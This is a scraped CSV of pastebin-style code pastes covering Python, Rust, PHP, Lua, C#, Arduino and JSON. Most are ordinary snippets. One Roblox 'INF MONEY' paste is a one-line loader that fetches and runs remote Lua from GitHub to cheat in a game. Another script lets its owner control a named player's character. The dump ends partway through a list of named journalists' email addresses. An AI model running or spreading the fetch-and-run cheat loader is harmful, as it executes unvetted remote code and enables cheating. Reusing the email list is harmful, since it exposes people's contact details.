id,title,username,language,date,content
VRVR1GkG,ejercicios pendientes,teslariu,Python,Thursday 24th of August 2023 01:00:19 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
'''
1) Pedir el ingreso de notas. La condición de salida es nota = -1. 
Luego, mostrar su promedio y el total de notas

2) Hacer un template while true con opciones de calculo de perimetros
y superficies: circulo, cuadrado, etc

      
# 1) 
contador = 0
notas = []
while True:
	nota = int(input(""Ingrese una nota: ""))
	if 0 <= nota <= 10:
		notas.append(nota)
	elif nota == -1:
		break
	else:
		print(""Error en el ingreso de la nota"")

print(f""""""
Total de notas: {len(notas)}
Promedio: {sum(notas)/len(notas):.2f}
"""""")
'''

# 2)
print(""""""
*---------------------------------*
| Cálculo de áreas y perímetros   |
*_________________________________*
"""""")

while True:
	print(""""""
	Menu de opciones:
	-----------------
	1. Círculo
	2. Cuadrado
	3. Rectángulo
	4. Salir
	-----------------
	"""""")
	opcion = input(""Ingrese una opción: "")
	
	if opcion == ""1"":
		radio = float(input(""Ingrese el radio: ""))
		print(f""Area: {3.1416*radio**2:.2f} - Perímetro: {2*3.1416*radio:.2f}"")
		
	elif opcion == ""2"":
		lado = float(input(""Ingrese el lado: ""))
		print(f""Area: {lado**2:.2f} - Perímetro: {4*lado:.2f}"")
		
	elif opcion == ""3"":
		a = float(input(""Ingrese un lado: ""))
		b = float(input(""Ingrese el otro lado: ""))
		print(f""Area: {a * b:.2f} - Perímetro: {2*(a + b):.2f}"")
		
	elif opcion == ""4"":
		print(""Gracias por utilizar este script..."")
		break
		
	else:
		print(""Opción incorrecta"")
		
	
	
	
	
	













"
u9Ntfihp,fake test,bellaoui,JSON,Thursday 24th of August 2023 12:46:30 PM CDT,"{
  ""Ads Controller"": {
    ""Ad Units"": {
      ""Applovin"": {
        ""max_banner_id"": ""698886ceezze74fe3"",
        ""max_interstitial_id"": ""0e35f3e811deb59d"",
        ""max_native_id"": ""44ed7e9f0af8ec88""
      },
      ""IronSource"": {
        ""iron_app_key"": ""139aa0199"",
        ""iron_banner_id"": ""DefaultBanner"",
        ""iron_interstitial_id"": ""DefaultInterstitial"",
        ""iron_native_id"": ""DefaultBanner""
      }
    },
    ""Ads Config"": {
      ""mode_ads_banner"": ""max"",
      ""mode_ads_interstitial"": ""max"",
      ""mode_ads_native"": ""max""
    }
  }
}"
sPWyR2jf,onzOS 2.0 Setup,PolskiWisnia,Lua,Thursday 24th of August 2023 12:14:55 PM CDT,"-- Microcraft NextUI Setup -- 
 
local function aw(...) return write(...) end
local function p(...) return print(...) end
local function s(...) return sleep(...) end
local function tw(...) return term.write(...) end
local function scp(...) return term.setCursorPos(...) end
local function sbc(...) return term.setBackgroundColor(...) end
local function stc(...) return term.setTextColor(...) end
local function tc(...) return term.clear(...) end
local function tcl(...) return term.clearLine(...) end
local function r(...) return shell.run(...) end
local function sp(...) return textutils.slowPrint(...) end
local function sw(...) return textutils.slowWrite(...) end
local function fse(...) return fs.exists(...) end
local function pul(...) return paintutils.loadImage(...) end
local function pud(...) return paintutils.drawImage(...) end
local function pfb(...) return paintutils.drawFilledBox(...) end
local function su(...) return os.shutdown(...) end
local function re(...) return os.reboot(...) end
local function pdp(...) return paintutils.drawPixel(...) end
 
w, h = term.getSize()

pliki = {""https://pastebin.com/raw/KmTjVypd"", ""https://pastebin.com/raw/3V1e5XLS""}

function downloadFile(url, sciezka)
    local response = http.get(url)
    if response then
        local fileContent = response.readAll()
        response.close()
        
        local file = fs.open(sciezka, ""w"")
        file.write(fileContent)
        file.close()
    else
        print(""Instalator napotkal blad z pobieraniem pliku. Jesli wystapi on ponownie uzyj wersji instalatora korzystajacej z API pastebin."")
    end
end

function setupUI()
	pfb(1,1,w,h, colors.blue)
	pfb(1,h,w,h,colors.gray)
	local char1 = ""\149""
	local char2 = ""\131""
	scp(1,1)
	stc(colors.white)
	sbc(colors.blue)
	p(""Instalator onzOS 2.0"")
	scp(1,2)
	p(char2, char2, char2, char2, char2, char2, char2, char2, char2)
end

function welcome()
	setupUI()
	scp(1,4)
	sbc(colors.blue)
	stc(colors.white)
	p[[Witamy w Instalatorze onzOS 2.0! Ten program przeprowadzi Cie przez proces pobrania oraz zainstalowania systemu Microcraft onzOS 2.0 na Twoim komputerze. Podazaj dalej za poleceniami Instalatora, aby kontynuowac]]
	scp(1,12)
	p[[Nacisnij ENTER, aby skonfigurowac komputer jako TERMINAL ODBIORCZY.]]
	p[[Nacisnij BACKSPACE, aby skonfigurowac komputer jako TERMINAL GLOSUJACY]]
	local event, key = os.pullEvent(""key"")
	p(key)
	if key == 14 then
		installVote()
	elseif key == 28 then
		installTerminal()
	else
		welcome()
	end
		
end

function installVote()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Pobieranie plikow systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	downloadFile(pliki[1], ""/startup"")
	scp(9,13)
	sbc(colors.yellow)
	stc(colors.yellow)
	sp(""******"")
	s(1)
	installVoteStage2()
end

function installTerminal()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Pobieranie plikow systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	downloadFile(pliki[2], ""/startup"")
	scp(9,13)
	sbc(colors.yellow)
	stc(colors.yellow)
	sp(""******"")
	s(1)
	installTerminalStage2()
end

function installVoteStage2()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Instalowanie ustawien systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	sbc(colors.blue)
	stc(colors.blue)
	r(""set shell.allow_disk_startup false"")
	file1 = fs.open("".computers"", ""w"")
	file1.close()
	stc(colors.white)
	write(""Podaj HASLO ADMINISTRATORA:"")
	haslo = read()
	file2 = fs.open("".haslo"", ""w"")
	file2.write(haslo)
	file2.close()
	s(1)
	pfb(1,h,w,h,colors.gray)
	stc(colors.white)
	scp(1,h)
	write(""Uruchamianie ponownie..."")
	for i = 9,42 do
		scp(i,13)
		sbc(colors.red)
		stc(colors.red)
		sp(""*"")
	end
	s(1)
	re()
end

function installTerminalStage2()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Instalowanie ustawien systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	sbc(colors.blue)
	stc(colors.blue)
	r(""set shell.allow_disk_startup false"")
	s(1)
	scp(1,4)
	stc(colors.white)
	write(""Podaj PROTOKOL, LOGIN i HASLO do TERMINALA GLOSUJACEGO onzOS 2.0."")
	protocol = read()
	login = read()
	password = read()
	file1 = fs.open("".prot"", ""w"")
	file1.write(protocol)
	file1.close()
	file2 = fs.open("".pass"", ""w"")
	file2.writeLine(login)
	file2.writeLine(password)
	file2.close()
	pfb(1,h,w,h,colors.gray)
	stc(colors.white)
	scp(1,h)
	write(""Uruchamianie ponownie..."")
	for i = 9,42 do
		scp(i,13)
		sbc(colors.red)
		stc(colors.red)
		sp(""*"")
	end
	s(1)
	re()
end

welcome()

"
8A3G2W0X,READ INT,GigaOrts,C#,Thursday 24th of August 2023 11:54:13 AM CDT,"public int ReadInt()
{
    int result;
    
    do
    {
        Console.Write(""Введите число: "");
    } while (int.TryParse(Console.ReadLine(), out result) == false);
    
    return result;
}"
STfzhWir,Untitled,geminilabs,PHP,Thursday 24th of August 2023 11:54:10 AM CDT,"/**
 * This snippet make a {membership_info} tag available in email notifications
 *
 * @param array $args
 * @param \GeminiLabs\SiteReviews\Modules\Email|\GeminiLabs\SiteReviews\Addon\Notifications\Email $email
 * @return array
 */
add_filter('site-reviews/email/compose', function ($args, $email) {
    $review = glsr()->args($email->data)->review;
    if (empty($review)) {
        return $args;
    }
    if ($user = $review->user()) {
        $membership = ''; // TODO: put the user's membership info here as a string
        $args['template-tags']['membership_info'] = $membership;
    }
    return $args;
}, 10, 2);
"
n2Qab4uG,Untitled,MAKASiNer,Rust,Thursday 24th of August 2023 11:36:34 AM CDT,"use async_graphql::{Enum, InputObject, SimpleObject};
use mongodb::bson::oid::ObjectId;
use serde::{Deserialize, Serialize};

//owner schema
#[derive(Debug, Clone, Serialize, Deserialize, SimpleObject)]
pub struct Owner {
    #[serde(skip_serializing_if = ""Option::is_none"")]
    pub _id: Option<ObjectId>,
    pub name: String,
    pub email: String,
    pub phone: String,
}

#[derive(InputObject)]
pub struct CreateOwner {
    pub name: String,
    pub email: String,
    pub phone: String,
}

#[derive(InputObject)]
pub struct FetchOwner {
    pub _id: String,
}

//project schema
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Enum)]
pub enum Status {
    NotStarted,
    InProgress,
    Completed,
}

#[derive(Debug, Clone, Serialize, Deserialize, SimpleObject)]
pub struct Project {
    #[serde(skip_serializing_if = ""Option::is_none"")]
    pub _id: Option<ObjectId>,
    pub owner_id: String,
    pub name: String,
    pub description: String,
    pub status: Status,
}

#[derive(InputObject)]
pub struct CreateProject {
    pub owner_id: String,
    pub name: String,
    pub description: String,
    pub status: Status,
}

#[derive(InputObject)]
pub struct FetchProject {
    pub _id: String,
}"
a0h2ih5b,Untitled,MAKASiNer,Rust,Thursday 24th of August 2023 11:33:21 AM CDT,"use dotenv::dotenv;
use futures::TryStreamExt;
use std::{env, io::Error};
use mongodb::{
    bson::{doc, oid::ObjectId},
    Client, Collection, Database,
};
use crate::schemas::project_schema::{Owner, Project};

pub struct DBMongo {
    db: Database,
}

impl DBMongo {
    pub async fn init() -> Self {
        dotenv().ok();
        let uri = match env::var(""MONGOURI"") {
            Ok(v) => v.to_string(),
            Err(_) => format!(""Error loading env variable""),
        };
        let client = Client::with_uri_str(uri)
            .await
            .expect(""error connecting to database"");
        let db = client.database(""projectMngt"");
        DBMongo { db }
    }

    fn col_helper<T>(data_source: &Self, collection_name: &str) -> Collection<T> {
        data_source.db.collection(collection_name)
    }

    //Owners logic
    pub async fn create_owner(&self, new_owner: Owner) -> Result<Owner, Error> {
        let new_doc = Owner {
            _id: None,
            name: new_owner.name.clone(),
            email: new_owner.email.clone(),
            phone: new_owner.phone.clone(),
        };
        let col = DBMongo::col_helper::<Owner>(&self, ""owner"");
        let data = col
            .insert_one(new_doc, None)
            .await
            .expect(""Error creating owner"");
        let new_owner = Owner {
            _id: data.inserted_id.as_object_id(),
            name: new_owner.name.clone(),
            email: new_owner.email.clone(),
            phone: new_owner.phone.clone(),
        };
        Ok(new_owner)
    }

    pub async fn get_owners(&self) -> Result<Vec<Owner>, Error> {
        let col = DBMongo::col_helper::<Owner>(&self, ""owner"");
        let mut cursors = col
            .find(None, None)
            .await
            .expect(""Error getting list of owners"");
        let mut owners: Vec<Owner> = Vec::new();
        while let Some(owner) = cursors
            .try_next()
            .await
            .expect(""Error mapping through cursor"")
        {
            owners.push(owner)
        }
        Ok(owners)
    }

    pub async fn single_owner(&self, id: &String) -> Result<Owner, Error> {
        let obj_id = ObjectId::parse_str(id).unwrap();
        let filter = doc! {""_id"": obj_id};
        let col = DBMongo::col_helper::<Owner>(&self, ""owner"");
        let owner_detail = col
            .find_one(filter, None)
            .await
            .expect(""Error getting owner's detail"");
        Ok(owner_detail.unwrap())
    }

    //project logics
    pub async fn create_project(&self, new_project: Project) -> Result<Project, Error> {
        let new_doc = Project {
            _id: None,
            owner_id: new_project.owner_id.clone(),
            name: new_project.name.clone(),
            description: new_project.description.clone(),
            status: new_project.status.clone(),
        };
        let col = DBMongo::col_helper::<Project>(&self, ""project"");
        let data = col
            .insert_one(new_doc, None)
            .await
            .expect(""Error creating project"");
        let new_project = Project {
            _id: data.inserted_id.as_object_id(),
            owner_id: new_project.owner_id.clone(),
            name: new_project.name.clone(),
            description: new_project.description.clone(),
            status: new_project.status.clone(),
        };
        Ok(new_project)
    }

    pub async fn get_projects(&self) -> Result<Vec<Project>, Error> {
        let col = DBMongo::col_helper::<Project>(&self, ""project"");
        let mut cursors = col
            .find(None, None)
            .await
            .expect(""Error getting list of projects"");
        let mut projects: Vec<Project> = Vec::new();
        while let Some(project) = cursors
            .try_next()
            .await
            .expect(""Error mapping through cursor"")
        {
            projects.push(project)
        }
        Ok(projects)
    }

    pub async fn single_project(&self, id: &String) -> Result<Project, Error> {
        let obj_id = ObjectId::parse_str(id).unwrap();
        let filter = doc! {""_id"": obj_id};
        let col = DBMongo::col_helper::<Project>(&self, ""project"");
        let project_detail = col
            .find_one(filter, None)
            .await
            .expect(""Error getting project's detail"");
        Ok(project_detail.unwrap())
    }
}"
Gyxe9a5S,Walk Controller,DrawingJhon,Lua,Thursday 24th of August 2023 11:18:25 AM CDT,"local target = game.Players[""USERNAME_HERE""]

local scr = NLS([[local remote = script:WaitForChild(""Remote"")
local target = script:WaitForChild(""Target"").Value

local tool = Instance.new(""Tool"")
tool.Name = target.Name.."" walk controller""
tool.RequiresHandle = false
tool.CanBeDropped = false

tool.Activated:Connect(function()
	remote:FireServer(owner:GetMouse().Hit.Position)
end)

tool.Parent = owner.Backpack
]], owner.PlayerGui)

local remote = Instance.new(""RemoteEvent"")
remote.Name = ""Remote""
remote.OnServerEvent:Connect(function(player, pos)
	if player ~= owner then return end
	
	target.Character.Humanoid:MoveTo(pos)
end)

local val = Instance.new(""ObjectValue"")
val.Value = target
val.Name = ""Target""

remote.Parent = scr
val.Parent = scr"
VURSjmJX,ACF Wordpress,NeaMitika,PHP,Thursday 24th of August 2023 11:15:34 AM CDT,"function custom_acf_filter_clients_by_photographer( $args, $field, $post_id ) {
    
    $current_user = wp_get_current_user();
    $current_user_id = get_current_user_id();
    
    // Verifica se l'utente che modifica il prodotto ha il ruolo ""fotografo""
    if ( in_array('fotografo', $current_user->roles)) {       

        // Ottieni gli ordini associati all'utente fotografo attuale.
        $args = array(
            'post_type'      => 'shop_order',
            'post_status'    => array('wc-pending', 'wc-processing', 'wc-on-hold', 'wc-completed', 'wc-cancelled', 'wc-refunded', 'wc-failed'), // Ho messo tutti gli stati, dopo lo modifico
            'posts_per_page' => -1,
            'meta_query'     => array(
                array(
                    'key'     => 'seleziona_fotografo_associato',
                    'value'   => $current_user_id,
                    'compare' => '=',
                ),
            ),
        );

        $orders = get_posts( $args );

        // Qui mi crea un array solo con gli id dei clienti che hanno ordini dove dentro è associato un fotografo
        $client_ids = wp_list_pluck( $orders, 'post_author' );

        // Filtra i clienti solo per quelli associati agli ordini del fotografo.
        $args['author__in'] = $client_ids;
    }

    return $args;
}

// Applica la funzione di filtro al campo ""seleziona_cliente"".
add_filter('acf/fields/select/query/name=seleziona_cliente', 'custom_acf_filter_clients_by_photographer', 10, 3);"
iQJkaARY,modal-video-on-click(approved),catfield,JavaScript,Thursday 24th of August 2023 10:48:43 AM CDT,"<script>
var scriptUrl = 'https://www.youtube.com/s/player/21812a9c/www-widgetapi.vflset/www-widgetapi.js';

try {
    var ttPolicy = window.trustedTypes.createPolicy(""youtube-widget-api"", {
        createScriptURL: function (x) {
            return x;
        }
    });
    scriptUrl = ttPolicy.createScriptURL(scriptUrl);
} catch (e) {}

var YT = YT || {
    loading: 0,
    loaded: 0
};

var YTConfig = window.YTConfig || {
    host: ""https://www.youtube.com""
};

let player;
let apiReady = false;
let modalOpened = false; // Added flag to track modal state

// Load the YouTube API
function loadYouTubeAPI() {
    if (!YT.loading) {
        YT.loading = 1;
        var a = document.createElement(""script"");
        a.type = ""text/javascript"";
        a.id = ""www-widgetapi-script"";
        a.src = scriptUrl;
        a.async = true;

        var c = document.currentScript;
        if (c) {
            var n = c.nonce || c.getAttribute(""nonce"");
            if (n) {
                a.setAttribute(""nonce"", n);
            }
        }

        var b = document.getElementsByTagName(""script"")[0];
        b.parentNode.insertBefore(a, b);
    }
}

function onYouTubeIframeAPIReady() {
    apiReady = true;

    if (modalOpened) {
        ModalFlexAndPlayVideo();
    }
}

function resetPlayerAndModal() {
    if (player) {
        player.pauseVideo();
    }
    var modalSection = document.querySelector('.fixed-modal-section');
    modalSection.style.display = 'none';
    modalOpened = false;
}

function ModalFlexAndPlayVideo() {
    var modalSection = document.querySelector('.fixed-modal-section');
    modalSection.style.display = 'flex';
    modalOpened = true;

    if (player) {
        // If player instance already exists, just play it.
        player.playVideo();
        console.log(""Video playing"");
    } else {
        if (apiReady) {
            player = new YT.Player('muteVideoYoutube', {
                events: {
                    'onReady': function (event) {
                        event.target.playVideo();
                        console.log(""Video playing"");
                    }
                }
            });
        } else {
            console.log(""API is not ready yet."");
            loadYouTubeAPI();
            console.log(""Loading YouTube API..."");
        }
    }
}

document.querySelector('.modal-close-btn').addEventListener('click', resetPlayerAndModal);
document.querySelector('.daria-testimonial-photo-block').addEventListener('click', ModalFlexAndPlayVideo);
</script>"
6QK11jry,Untitled,GigaOrts,C#,Thursday 24th of August 2023 09:56:51 AM CDT,"static void Main(string[] args)
{
    const ConsoleColor redColor = ConsoleColor.Red;
    const ConsoleColor greenColor = ConsoleColor.Green;
    const ConsoleColor blueColor = ConsoleColor.Blue;

    const string MenuRedColor = ""1"";
    const string MenuGreenColor = ""2"";
    const string MenuBlueColor = ""3"";

    Console.WriteLine($""У нас на выбор имеются следующие цвета:"" +
        $""{redColor},"" +
        $""{greenColor},"" +
        $""{blueColor},"");

    switch (Console.ReadLine())
    {
        case MenuRedColor:
            Console.ForegroundColor = redColor;
            break;
        case MenuGreenColor:
            Console.ForegroundColor = greenColor;
            break;
        case MenuBlueColor:
            Console.ForegroundColor = blueColor;
            break;
    }
}"
7vLebuzd,Kim and Refrigerators SRBD,Mohammad_Dipu_Sultan,C++,Thursday 24th of August 2023 09:46:40 AM CDT,"#include<bits/stdc++.h>
using namespace std;

int x[16], y[16];
int n, ans;
vector<int> seen;

void kim(int cur, int indcnt, int cost){

	if(indcnt==n){

		ans=min(ans, cost+abs(x[cur]-x[1])+abs(y[cur]-y[1]));
		return;
	}

	for(int i=2; i<n+2; i++){

		if(seen[i]==0){
			seen[i]=1;
			kim(i, indcnt+1, cost+abs(x[cur]-x[i])+abs(y[cur]-y[i]));
			seen[i]=0;
		}
	}
}

int main(){

	int t=10;
	int cases=1;
	while(t--){
		cin >> n;
		seen.assign(n+2, 0);

		for(int i=0; i<n+2; i++){
			cin >> x[i] >> y[i];
		}

		ans=INT_MAX;

		kim(0, 0, 0);

		cout << ""# "" << cases++ << "" "" << ans << endl;
	}
	return 0;
}"
MeKC1U8g,Roblox Destruction Simulator OP Script (INF MONEY),LisMeme0123liskigi,Lua,Thursday 24th of August 2023 09:44:47 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/0123liskigi/Destruction-Simulator/work/DESTRUCTION!.lua""))()"
xCiASWLj,modal-video-on-click,catfield,JavaScript,Thursday 24th of August 2023 09:30:45 AM CDT,"<script>
var scriptUrl = 'https://www.youtube.com/s/player/21812a9c/www-widgetapi.vflset/www-widgetapi.js';

try {
    var ttPolicy = window.trustedTypes.createPolicy(""youtube-widget-api"", {
        createScriptURL: function (x) {
            return x;
        }
    });
    scriptUrl = ttPolicy.createScriptURL(scriptUrl);
} catch (e) {}

var YT = YT || {
    loading: 0,
    loaded: 0
};

var YTConfig = window.YTConfig || {
    host: ""https://www.youtube.com""
};

let player;
let apiReady = false;
let modalOpened = false; // Added flag to track modal state

// Load the YouTube API
function loadYouTubeAPI() {
    if (!YT.loading) {
        YT.loading = 1;
        var a = document.createElement(""script"");
        a.type = ""text/javascript"";
        a.id = ""www-widgetapi-script"";
        a.src = scriptUrl;
        a.async = true;

        var c = document.currentScript;
        if (c) {
            var n = c.nonce || c.getAttribute(""nonce"");
            if (n) {
                a.setAttribute(""nonce"", n);
            }
        }

        var b = document.getElementsByTagName(""script"")[0];
        b.parentNode.insertBefore(a, b);
    }
}

function onYouTubeIframeAPIReady() {
    apiReady = true;

    if (modalOpened) {
        ModalFlexAndPlayVideo();
    }
}

function resetPlayerAndModal() {
    if (player) {
        player.pauseVideo();
        player.destroy();
    }
    var modalSection = document.querySelector('.fixed-modal-section');
    modalSection.style.display = 'none';
    modalOpened = false;
}

function ModalFlexAndPlayVideo() {
    if (apiReady) {
        player = new YT.Player('muteVideoYoutube', {
            events: {
                'onReady': function (event) {
                    event.target.playVideo();
                    var modalSection = document.querySelector('.fixed-modal-section');
                    modalSection.style.display = 'flex';
                    modalOpened = true;
                    console.log(""Video playing"");
                }
            }
        });
    } else {
        console.log(""API is not ready yet."");
        loadYouTubeAPI();
        console.log(""Loading YouTube API..."");
    }
}

document.querySelector('.modal-close-btn').addEventListener('click', resetPlayerAndModal);
document.querySelector('.daria-testimonial-photo-block').addEventListener('click', ModalFlexAndPlayVideo);
</script>"
YSku8HtH,modbus_slave_to_float,mikroavr,Arduino,Thursday 24th of August 2023 09:17:56 AM CDT,"#include <avr/wdt.h>
#include <Wire.h>
//#include <LiquidCrystal_I2C.h>
#include <Adafruit_ADS1015.h>


#include <SimpleModbusSlave.h>
/* This example code has 9 holding registers. 6 analogue inputs, 1 button, 1 digital output
   and 1 register to indicate errors encountered since started.
   Function 5 (write single coil) is not implemented so I'm using a whole register
   and function 16 to set the onboard Led on the Atmega328P.
   
   The modbus_update() method updates the holdingRegs register array and checks communication.

   Note:  
   The Arduino serial ring buffer is 128 bytes or 64 registers.
   Most of the time you will connect the arduino to a master via serial
   using a MAX485 or similar.
 
   In a function 3 request the master will attempt to read from your
   slave and since 5 bytes is already used for ID, FUNCTION, NO OF BYTES
   and two BYTES CRC the master can only request 122 bytes or 61 registers.
 
   In a function 16 request the master will attempt to write to your 
   slave and since a 9 bytes is already used for ID, FUNCTION, ADDRESS, 
   NO OF REGISTERS, NO OF BYTES and two BYTES CRC the master can only write
   118 bytes or 59 registers.
 
   Using the FTDI USB to Serial converter the maximum bytes you can send is limited 
   to its internal buffer which is 60 bytes or 30 unsigned int registers. 
 
   Thus:
 
   In a function 3 request the master will attempt to read from your
   slave and since 5 bytes is already used for ID, FUNCTION, NO OF BYTES
   and two BYTES CRC the master can only request 54 bytes or 27 registers.
 
   In a function 16 request the master will attempt to write to your 
   slave and since a 9 bytes is already used for ID, FUNCTION, ADDRESS, 
   NO OF REGISTERS, NO OF BYTES and two BYTES CRC the master can only write
   50 bytes or 25 registers.
 
   Since it is assumed that you will mostly use the Arduino to connect to a 
   master without using a USB to Serial converter the internal buffer is set
   the same as the Arduino Serial ring buffer which is 128 bytes.
*/
 

// Using the enum instruction allows for an easy method for adding and 
// removing registers. Doing it this way saves you #defining the size 
// of your slaves register array each time you want to add more registers
// and at a glimpse informs you of your slaves register layout.

//////////////// registers of your slave ///////////////////
enum 
{     
  // just add or remove registers and your good to go...
  // The first register starts at address 0
  ADC0,     
  ADC1,        
  ADC2,
  ADC3,
  ADC4,
  ADC5,
  ADC6,
  ADC7,
  ADC8,
  ADC9,
  ADC10,
  ADC11,
  TOTAL_ERRORS,
  // leave this one
  TOTAL_REGS_SIZE 
  // total number of registers for function 3 and 16 share the same register array
};

unsigned int holdingRegs[TOTAL_REGS_SIZE]; // function 3 and 16 register array
////////////////////////////////////////////////////////////

//LiquidCrystal_I2C lcd(20, 4);
Adafruit_ADS1115 ads;  /* Use this for the 16-bit version */
int16_t adc0, adc1, adc2, adc3;
float v1, v2, v3, v4;
//String line1, line2, line3, line4;

union Pun {
  float f; uint32_t u;
};

void setup()
{
  //pinMode(A0, OUTPUT);
  wdt_enable(WDTO_8S);
  //digitalWrite(A0, HIGH);
  //delay(2000);
  //digitalWrite(A0, LOW); 
  //lcd.autoAddress();
  //lcd.begin();
  
  /* parameters(long baudrate, 
                unsigned char ID, 
                unsigned char transmit enable pin, 
                unsigned int holding registers size,
                unsigned char low latency)
                
     The transmit enable pin is used in half duplex communication to activate a MAX485 or similar
     to deactivate this mode use any value < 2 because 0 & 1 is reserved for Rx & Tx.
     Low latency delays makes the implementation non-standard
     but practically it works with all major modbus master implementations.
  */
  ads.setGain(GAIN_TWOTHIRDS);  
  ads.begin();
  
  modbus_configure(9600, 1, 16, TOTAL_REGS_SIZE, 0);
 
 }

void loop()
{
  // modbus_update() is the only method used in loop(). It returns the total error
  // count since the slave started. You don't have to use it but it's useful
  // for fault finding by the modbus master.
  wdt_reset();
  holdingRegs[TOTAL_ERRORS] = modbus_update(holdingRegs);
   
  for ( int i = 0; i<4; i++){
     holdingRegs[i] = ads.readADC_SingleEnded(i);
     delayMicroseconds(50);   
  }
  v1 = (holdingRegs[0] * 0.1875)/1000;
  v2 = (holdingRegs[1] * 0.1875)/1000;
  v3 = (holdingRegs[2] * 0.1875)/1000;
  v4 = (holdingRegs[3] * 0.1875)/1000;

  encodeFloat(&holdingRegs[4], v1);
  delayMicroseconds(50);
  encodeFloat(&holdingRegs[6], v2);
  delayMicroseconds(50);
  encodeFloat(&holdingRegs[8], v3);
  delayMicroseconds(50);
  encodeFloat(&holdingRegs[10], v4);
  delayMicroseconds(50);
  
    //unsigned long teg = (unsigned long)holdingRegs[4] << 16 | holdingRegs[5];
  /*
  float dtTeg1 = decodeFloat(&holdingRegs[4]);
  float dtTeg2 = decodeFloat(&holdingRegs[6]);
  float dtTeg3 = decodeFloat(&holdingRegs[8]);
  float dtTeg4 = decodeFloat(&holdingRegs[10]);

  line1 = String(holdingRegs[0]) + "", "" + String(dtTeg1,5);
  line2 = String(holdingRegs[1]) + "", "" + String(dtTeg2,5);
  line3 = String(holdingRegs[2]) + "", "" + String(dtTeg3,5);
  line4 = String(holdingRegs[3]) + "", "" + String(dtTeg4,5);
  
  lcd.clear();
  lcd.setCursor(0,0);
  lcd.print(line1);
  
  lcd.setCursor(0,1);
  lcd.print(line2);
  
  lcd.setCursor(0,2);
  lcd.print(line3);

  lcd.setCursor(0,3);
  lcd.print(line4);
  delay(10);
  */
}

void encodeFloat(uint16_t *regs, float x){
  union Pun pun;
  pun.f = x;
  regs[0] = (pun.u>>16) & 0xFFFFU;
  regs[1] = pun.u & 0xFFFFU;
}

/*float decodeFloat(const uint16_t *regs){
 union Pun pun;
 pun.u = ((uint32_t)regs[0] << 16) | regs[1];
 return pun.f; 
}
*/
"
W2FnvV6w,poop,kizn,Lua,Thursday 24th of August 2023 09:01:57 AM CDT,"local caller = getScriptCaller()

function getDelta()
  local t = {}
  t.current = getLocalData(tostring(caller.id)..""shit"") or 0
  t.delta = math.random(5, 25)
  t.current = t.current + t.delta
  setLocalData(tostring(caller.id)..""shit"", t.current)
  return t
end

function updateTime()
  setLocalData(tostring(caller.id) .. 'timeshit', os.time())
end

function checkTime()
  local time = getLocalData(tostring(caller.id) .. 'timeshit')
  if not time then
    setLocalData(tostring(caller.id)..""timeshit"", 0)
    updateTime()
    return true
  end
  if time and os.time() - tonumber(time) > 24*60*60 then
    updateTime()
    return true
  end
  return false 
end

function enlarge()
  if isChat() then
    local user = (caller.username) and "" @""..caller.username.."" "" or caller.first_name.."" ""
    if checkTime() then
      local t = getDelta()
      return user.."", ты высрал "" .. t.delta .. "" см. говна. В твоей яме уже ""..t.current.."" см. говна""
    else
      return os.date(user .. ', ты уже срал сегодня! Приходи через %H часов %M минут', 45*60*60 - os.time() + tonumber(getLocalData(tostring(caller.id .. 'timeshit'))))
    end
  else
    return 'Юзай в чате, чтобы все видели, сколько ты насрал!'
  end
end

function printTop()
  local t = getAllUserData()
  local s = 'ДЛИНА ГОВНА В ЯМАХ ЧЛЕНОВ КОНФЫ\n'
  --local r = {}
  if not getUserCount() then
    return 'Используй в конфе!'
  end
  for i = 1, getUserCount() do
    if t[i] and t[i].id and getLocalData(tostring(t[i].id)..""shit"") then
      t[i].score = tonumber(getLocalData(tostring(t[i].id)..""shit""))
    else
      t[i] = nil
    end
  end
  local c = {}
  for i = 1, getUserCount() do
    if t[i] then
      table.insert(c, t[i])
    end
  end
  table.sort(c, function(a,b) return a.score > b.score end)
  for i = 1, #c do
    if c[i].first_name then
      s = s .. c[i].first_name .. ' - ' ..c[i].score .. ' см.\n'
    end
  end
  return s
end

if _ARGS == 'top' or _ARGS == 'топ' then
  return printTop()
end

return enlarge()"
tDxSGBS2,manifest.json,ManifoldHydra80,JSON,Thursday 24th of August 2023 08:52:57 AM CDT,"{
	""manifest_version"": 3,
	""name"": ""testcode"",
	""version"": ""1.0"",
	""content_scripts"": [
	{
			""js"": [""script.js""],
			""matches"": [""<all_urls>""]
			}
	]
}"
JGBGwbpt,script.js,ManifoldHydra80,JavaScript,Thursday 24th of August 2023 08:51:00 AM CDT,alert('hello word!')
C8WSgQSA,verificamultiplo,davegimo,Python,Thursday 24th of August 2023 08:40:40 AM CDT,"def verificaMultiplo(a,x,k):
    if isNull(a):
        return False
    
    return auxmultiplo(a,x,k,0)



def auxmultiplo(a,x,k,liv_corrente):
    if isNull(a):
        return True

    if liv_corrente > k:
        return info(a) % x == 0 and auxmultiplo(left(a),x,k,liv_corrente + 1) and auxmultiplo(right(a),x,k,liv_corrente + 1)
    else:
        return auxmultiplo(left(a),x,k,liv_corrente + 1) and auxmultiplo(right(a),x,k,liv_corrente + 1) "
h9WW8anK,Press report,liammcmullen,JSON,Thursday 24th of August 2023 08:36:32 AM CDT,"{
  ""Irish News"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""Irish News Supplement"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Banbridge Chronicle"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""anne.reynolds@nationalworld.com"",
    ""joanne.monk@nationalworld.com "",
